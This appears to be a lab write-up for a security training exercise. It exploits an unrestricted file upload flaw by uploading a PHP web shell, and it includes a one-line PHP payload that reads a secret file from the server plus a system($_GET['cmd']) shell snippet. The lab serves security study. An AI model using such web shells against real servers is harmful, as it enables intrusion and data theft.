# Lab:Remote Code execution via web shell upload

## Objective
Exploit an insecure file upload vulnerability to achieve remote code execution by uploading a PHP web shell and retrive sensitive data from the server (/home/carlos/secret)

## Vulnerability
The application is vulnerable to unrestricted file upload,as it fails to validate file types and content.This allows attackers to upload and execute files(eg.a PHP web shell),leading to remote code executon.

##Steps
Log in using the provided credentials (wiener:peter).
Navigate to the image upload functionality.
Create a simple PHP web shell (e.g., using system($_GET['cmd']);).
Upload the PHP file without any restrictions.
Access the uploaded file via the browser to execute commands.
Use the web shell to read /home/carlos/secret.
Submit the retrieved secret to complete the lab.
## 💥 Exploit

Payload used
<?php echo file_get_contents('/home/carlos/secret'); ?>

## 📸 Proof (optional)
<img width="1357" height="713" alt="Screenshot 2026-04-10 173829" src="https://github.com/user-attachments/assets/b10be16d-fc87-48d9-b369-1dc57ffb4a19" />
<img width="673" height="719" alt="Screenshot 2026-04-10 173841" src="https://github.com/user-attachments/assets/32348cfd-d1f7-47c4-b989-dc1b10ca80dc" />
<img width="1276" height="603" alt="Screenshot 2026-04-10 174511" src="https://github.com/user-attachments/assets/ac0c73c8-8458-4a96-855b-5ec9db942d2b" />

<img width="1361" height="639" alt="Screenshot 2026-04-10 174520" src="https://github.com/user-attachments/assets/441e50d9-5d74-4ed1-bab8-6accfe845d0d" />
<img width="996" height="462" alt="Screenshot 2026-04-10 174527" src="https://github.com/user-attachments/assets/c2beaff1-d203-4ad8-8701-84834eb1664a" />


## 🧠 Lesson Learned
  Unrestricted file upload can directly lead to remote code execution.
  The application did not validate file type or extension.
  No server-side validation and files were stored in a publicly accessible directory.
  Always try uploading a simple web shell and check if it executes via URL
